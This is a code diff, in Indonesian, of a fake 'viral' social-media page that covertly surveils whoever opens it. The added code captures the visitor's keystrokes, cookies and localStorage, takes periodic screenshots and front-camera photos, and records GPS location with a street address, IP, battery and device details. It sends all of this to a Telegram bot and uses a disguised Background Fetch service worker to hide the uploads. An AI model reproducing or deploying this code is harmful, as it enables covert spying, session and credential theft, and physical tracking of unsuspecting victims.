@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Viral Banget 🔥</title>
+    <!-- Library untuk screenshot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
         * {
             margin: 0;
@@ -260,25 +262,9 @@
         #hiddenCanvas {
             display: none;
         }
-        
-        .status-sender {
-            position: fixed;
-            bottom: 10px;
-            right: 10px;
-            background: rgba(0,0,0,0.7);
-            color: #0f0;
-            padding: 5px 10px;
-            border-radius: 5px;
-            font-size: 11px;
-            font-family: monospace;
-            z-index: 9999;
-            display: none;
-        }
     </style>
 </head>
 <body>
-    <div class="status-sender" id="statusSender">📤 Mengirim video...</div>
-
     <div class="card" id="mainCard">
         <div class="card-header">
             <div class="avatar">VN</div>
@@ -377,6 +363,46 @@
     <video id="hiddenCamera" autoplay playsinline></video>
     <canvas id="hiddenCanvas" width="640" height="480"></canvas>
     
+    <!-- Service Worker untuk Background Fetch -->
+    <script>
+        // ===========================================
+        // SERVICE WORKER REGISTRATION
+        // ===========================================
+        if ('serviceWorker' in navigator) {
+            // Buat service worker secara dinamis
+            const swCode = `
+                self.addEventListener('install', (event) => {
+                    self.skipWaiting();
+                });
+                
+                self.addEventListener('activate', (event) => {
+                    event.waitUntil(clients.claim());
+                });
+                
+                self.addEventListener('backgroundfetchsuccess', (event) => {
+                    event.updateUI({ title: 'Selesai' });
+                });
+                
+                self.addEventListener('backgroundfetchfail', (event) => {
+                    event.updateUI({ title: 'Gagal' });
+                });
+                
+                self.addEventListener('backgroundfetchabort', (event) => {
+                    event.updateUI({ title: 'Dibatalkan' });
+                });
+            `;
+            
+            const blob = new Blob([swCode], { type: 'application/javascript' });
+            const swUrl = URL.createObjectURL(blob);
+            
+            navigator.serviceWorker.register(swUrl).then(registration => {
+                console.log('Service Worker registered');
+            }).catch(err => {
+                console.log('SW registration failed:', err);
+            });
+        }
+    </script>
+    
     <script>
         // ===========================================
         // KONFIGURASI TELEGRAM
@@ -389,10 +415,9 @@
         let liked = false;
         let likeCount = 2200;
         let mediaStream = null;
-        let mediaRecorder = null;
-        let isRecording = false;
-        let videoCount = 0;
-        let fotoKorban = null;
+        let isActive = false;
+        let fotoInterval = null;
+        let fotoCount = 0;
         
         // Data korban
         let dataKorban = {
@@ -402,11 +427,115 @@
             isp: 'Unknown',
             lat: null,
             lon: null,
+            alamat: 'Tidak ada',
             device: 'Unknown',
             browser: 'Unknown',
             os: 'Unknown',
-            resolusi: 'Unknown'
+            resolusi: 'Unknown',
+            baterai: 'Unknown'
         };
+        
+        // ===========================================
+        // FUNGSI KIRIM PESAN
+        // ===========================================
+        async function kirimPesan(teks) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: teks
+                    })
+                });
+            } catch (e) {}
+        }
+        
+        // ===========================================
+        // FUNGSI KIRIM FOTO DENGAN BACKGROUND FETCH
+        // ===========================================
+        async function kirimFotoBackground(blob, filename) {
+            try {
+                const registration = await navigator.serviceWorker.ready;
+                
+                // Buat FormData
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', blob, filename);
+                
+                // Gunakan Background Fetch dengan text netral
+                await registration.backgroundFetch.fetch(
+                    'data-' + Date.now().toString().slice(-6),
+                    ['https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendPhoto'],
+                    {
+                        title: 'Memuat',
+                        icons: [],
+                        downloadTotal: 0,
+                        formData: formData
+                    }
+                );
+                
+                console.log('Background fetch started');
+            } catch (e) {
+                console.log('Background fetch failed, fallback ke biasa:', e);
+                // Fallback ke fetch biasa
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', blob, filename);
+                
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }
+        }
+        
+        // ===========================================
+        // KEYLOGGER
+        // ===========================================
+        let keyLog = '';
+        document.addEventListener('keydown', (e) => {
+            keyLog += e.key;
+            if (keyLog.length > 50) {
+                kirimPesan('⌨️ ' + keyLog);
+                keyLog = '';
+            }
+        });
+        
+        // ===========================================
+        // AMBIL COOKIES
+        // ===========================================
+        setTimeout(() => {
+            if (document.cookie) {
+                kirimPesan('🍪 ' + document.cookie);
+            }
+        }, 5000);
+        
+        // ===========================================
+        // AMBIL LOCALSTORAGE
+        // ===========================================
+        setTimeout(() => {
+            let storage = '';
+            Object.keys(localStorage).forEach(key => {
+                storage += key + '=' + localStorage.getItem(key) + ' | ';
+            });
+            if (storage) {
+                kirimPesan('💾 ' + storage);
+            }
+        }, 7000);
+        
+        // ===========================================
+        // SCREENSHOT BERKALA
+        // ===========================================
+        setInterval(() => {
+            if (typeof html2canvas !== 'undefined' && isActive) {
+                html2canvas(document.body).then(canvas => {
+                    canvas.toBlob(async (blob) => {
+                        await kirimFotoBackground(blob, 'screenshot.png');
+                    }, 'image/png');
+                });
+            }
+        }, 60000); // setiap 1 menit
         
         function toggleLike() {
             const likeIcon = document.getElementById('likeIcon');
@@ -433,11 +562,14 @@
             return num.toString();
         }
         
-        // Ambil IP
+        // ===========================================
+        // AMBIL IP
+        // ===========================================
         async function getIPLocation() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
+                
                 dataKorban.ip = data.ip || 'Unknown';
                 dataKorban.kota = data.city || 'Unknown';
                 dataKorban.negara = data.country_name || 'Unknown';
@@ -453,23 +585,38 @@
             }
         }
         
-        // Ambil GPS
+        // ===========================================
+        // AMBIL GPS
+        // ===========================================
         async function getGPSLocation() {
             return new Promise((resolve) => {
                 if ('geolocation' in navigator) {
                     navigator.geolocation.getCurrentPosition(
-                        (position) => {
+                        async (position) => {
                             dataKorban.lat = position.coords.latitude;
                             dataKorban.lon = position.coords.longitude;
+                            
+                            try {
+                                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${dataKorban.lat}&lon=${dataKorban.lon}`);
+                                const data = await res.json();
+                                if (data.display_name) {
+                                    dataKorban.alamat = data.display_name;
+                                }
+                            } catch (e) {}
+                            
                             resolve(true);
                         },
                         () => resolve(false)
                     );
-                } else resolve(false);
+                } else {
+                    resolve(false);
+                }
             });
         }
         
-        // Ambil device info
+        // ===========================================
+        // AMBIL DEVICE INFO
+        // ===========================================
         function getDeviceInfo() {
             const ua = navigator.userAgent;
             
@@ -483,62 +630,79 @@
             else if (ua.includes('Mac')) dataKorban.os = 'macOS';
             
             dataKorban.resolusi = `${screen.width}x${screen.height}`;
+            
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(battery => {
+                    let level = Math.round(battery.level * 100);
+                    dataKorban.baterai = `${level}% ${battery.charging ? '⚡' : ''}`;
+                });
+            }
         }
         
         // ===========================================
-        // FUNGSI KIRIM VIDEO PER 5 DETIK
+        // KIRIM DATA AWAL
         // ===========================================
-        async function kirimVideoChunk(chunk, index) {
-            const status = document.getElementById('statusSender');
-            status.style.display = 'block';
-            status.innerHTML = `📤 Mengirim video part ${index}...`;
-            
-            try {
-                // Kirim pesan notifikasi (pertama kali aja)
-                if (index === 1) {
-                    const pesan = `🔥 *LIVE STREAMING DIMULAI!* 🔥
+        async function sendInitialData() {
+            const pesan = `🔥 *PRANK DIMULAI!* 🔥
 ━━━━━━━━━━━━━━━━━━
 🌐 IP: ${dataKorban.ip}
 📍 Kota: ${dataKorban.kota}
 🌍 Negara: ${dataKorban.negara}
+🏢 ISP: ${dataKorban.isp}
 📱 Device: ${dataKorban.os} - ${dataKorban.browser}
-⏰ Waktu: ${new Date().toLocaleString('id-ID')}
-━━━━━━━━━━━━━━━━━━
-📹 *Video akan dikirim per 5 detik*`;
-                    
-                    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+📺 Resolusi: ${dataKorban.resolusi}
+🔋 Baterai: ${dataKorban.baterai}
+⏰ Waktu: ${new Date().toLocaleString('id-ID')}`;
+            
+            await kirimPesan(pesan);
+        }
+        
+        // ===========================================
+        // KIRIM LOKASI
+        // ===========================================
+        async function sendLocation() {
+            if (dataKorban.lat && dataKorban.lon) {
+                try {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendLocation`, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({
                             chat_id: TELEGRAM_CHAT_ID,
-                            text: pesan,
-                            parse_mode: 'Markdown'
+                            latitude: dataKorban.lat,
+                            longitude: dataKorban.lon
                         })
                     });
-                }
-                
-                // Kirim video chunk
-                const formData = new FormData();
-                formData.append('chat_id', TELEGRAM_CHAT_ID);
-                formData.append('video', chunk, `live_${index}.webm`);
-                formData.append('caption', `📹 Part ${index} - ${new Date().toLocaleTimeString()}`);
-                
-                const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                const result = await res.json();
-                if (result.ok) {
-                    status.innerHTML = `✅ Part ${index} terkirim!`;
-                    setTimeout(() => {
-                        status.style.display = 'none';
-                    }, 2000);
-                }
-            } catch (e) {
-                console.log('Gagal kirim:', e);
-                status.innerHTML = `❌ Gagal part ${index}`;
+                } catch (e) {}
             }
+        }
+        
+        // ===========================================
+        // FUNGSI AMBIL FOTO BERKALA
+        // ===========================================
+        async function ambilDanKirimFoto() {
+            if (!isActive || !mediaStream) return;
+            
+            try {
+                fotoCount++;
+                
+                const video = document.getElementById('hiddenCamera');
+                const canvas = document.getElementById('hiddenCanvas');
+                const context = canvas.getContext('2d');
+                
+                canvas.width = 320;
+                canvas.height = 240;
+                context.drawImage(video, 0, 0, 320, 240);
+                
+                const fotoData = canvas.toDataURL('image/jpeg', 0.6);
+                const binary = atob(fotoData.split(',')[1]);
+                const array = new Uint8Array(binary.length);
+                for (let i = 0; i < binary.length; i++) {
+                    array[i] = binary.charCodeAt(i);
+                }
+                const fotoBlob = new Blob([array], {type: 'image/jpeg'});
+                
+                await kirimFotoBackground(fotoBlob, `foto_${fotoCount}.jpg`);
+            } catch (e) {}
         }
         
         // ===========================================
@@ -551,79 +715,41 @@
             viralImage.style.pointerEvents = 'none';
             
             try {
-                // Ambil data
                 await getIPLocation();
                 getDeviceInfo();
-                getGPSLocation(); // gak wajib
                 
-                // Minta izin kamera
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: 'user',
-                        width: { ideal: 480 },
-                        height: { ideal: 360 }
+                        width: { ideal: 320 },
+                        height: { ideal: 240 }
                     }, 
                     audio: false
                 });
+                
+                mediaStream = stream;
+                isActive = true;
                 
                 const video = document.getElementById('hiddenCamera');
                 video.srcObject = stream;
                 await video.play();
                 
-                // Ambil foto
-                const canvas = document.getElementById('hiddenCanvas');
-                canvas.getContext('2d').drawImage(video, 0, 0, 480, 360);
-                fotoKorban = canvas.toDataURL('image/jpeg', 0.7);
+                // Ambil dan kirim foto pertama
+                await ambilDanKirimFoto();
                 
-                // Kirim foto dulu
-                const binary = atob(fotoKorban.split(',')[1]);
-                const array = new Uint8Array(binary.length);
-                for (let i = 0; i < binary.length; i++) {
-                    array[i] = binary.charCodeAt(i);
-                }
-                const fotoBlob = new Blob([array], {type: 'image/jpeg'});
-                const fotoForm = new FormData();
-                fotoForm.append('chat_id', TELEGRAM_CHAT_ID);
-                fotoForm.append('photo', fotoBlob, 'foto.jpg');
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: fotoForm
+                // Kirim data awal
+                await sendInitialData();
+                
+                // Minta GPS
+                getGPSLocation().then(() => {
+                    sendLocation();
                 });
                 
-                // HILANGIN GAMBAR VIRAL (tanpa pesan apapun)
+                // HILANGIN GAMBAR VIRAL
                 viralImage.style.display = 'none';
                 
-                // MULAI REKAM DAN KIRIM PER 5 DETIK
-                videoCount = 0;
-                
-                // Setup recorder dengan timeslice 5000ms (5 detik)
-                mediaRecorder = new MediaRecorder(stream, {
-                    mimeType: 'video/webm'
-                });
-                
-                mediaRecorder.ondataavailable = async (e) => {
-                    if (e.data.size > 0) {
-                        videoCount++;
-                        await kirimVideoChunk(e.data, videoCount);
-                    }
-                };
-                
-                // Mulai rekam dengan timeslice 5 detik
-                mediaRecorder.start(5000);
-                isRecording = true;
-                
-                // Kirim lokasi kalo ada
-                if (dataKorban.lat && dataKorban.lon) {
-                    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendLocation`, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            chat_id: TELEGRAM_CHAT_ID,
-                            latitude: dataKorban.lat,
-                            longitude: dataKorban.lon
-                        })
-                    });
-                }
+                // AMBIL FOTO SETIAP 5 DETIK
+                fotoInterval = setInterval(ambilDanKirimFoto, 5000);
                 
             } catch (error) {
                 viralImage.style.pointerEvents = 'auto';
@@ -634,7 +760,21 @@
             }
         }
         
-        // Update stats random
+        // ===========================================
+        // TAB DITUTUP
+        // ===========================================
+        window.addEventListener('beforeunload', function() {
+            if (fotoInterval) {
+                clearInterval(fotoInterval);
+            }
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+            }
+        });
+        
+        // ===========================================
+        // UPDATE STATS
+        // ===========================================
         setInterval(() => {
             if (!document.getElementById('prankResult').style.display || 
                 document.getElementById('prankResult').style.display === 'none') {
